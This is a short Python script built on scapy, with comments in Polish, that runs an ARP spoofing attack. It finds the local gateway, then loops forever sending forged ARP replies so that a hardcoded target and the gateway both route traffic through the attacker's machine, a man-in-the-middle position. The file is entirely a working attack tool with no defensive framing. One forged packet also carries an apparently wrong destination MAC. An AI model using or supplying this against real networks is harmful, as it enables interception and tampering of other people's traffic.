from scapy.all import ARP, send, get_if_hwaddr, conf, srp, Ether
import time

def get_gateway_ip():
    # Pobieranie adresu IP bramy z konfiguracji routingu
    return conf.route.route("0.0.0.0")[2]
def get_mac(ip):
    # Wysyłanie zapytania ARP, aby uzyskać adres MAC dla danego IP
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    return None
def arp_spoof(target_ip, gateway_ip):
    # Pobieranie adresu MAC urządzenia, z którego uruchamiany jest program
    interface = conf.iface
    attacker_mac = get_if_hwaddr(interface)
    # Pobieranie adresu MAC bramy
    gateway_mac = get_mac(gateway_ip)
    if not gateway_mac:
        print(f"Could not find MAC address for gateway IP: {gateway_ip}")
        return
    # Tworzenie fałszywych pakietów ARP
    arp_response_to_target = ARP(op=2, pdst=target_ip, hwdst=gateway_mac, psrc=gateway_ip, hwsrc=attacker_mac)
    arp_response_to_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=attacker_mac)
    # Wysyłanie pakietów ARP co 2 sekundy
    while True:
        send(arp_response_to_target, verbose=False)
        send(arp_response_to_gateway, verbose=False)
        print(f"Sent spoofed ARP packets: {gateway_ip} is-at {attacker_mac} and {target_ip} is-at {attacker_mac}")
        time.sleep(2)

if __name__ == "__main__":
    target_ip = "192.168.0.19"  # Adres IP celu
    gateway_ip = get_gateway_ip()
    if gateway_ip:
        print(f"Gateway IP: {gateway_ip}")
        print(f"Starting ARP spoofing attack on {target_ip} and {gateway_ip}...")
        arp_spoof(target_ip, gateway_ip)
    else:
        print("Could not determine the gateway IP. Exiting...")
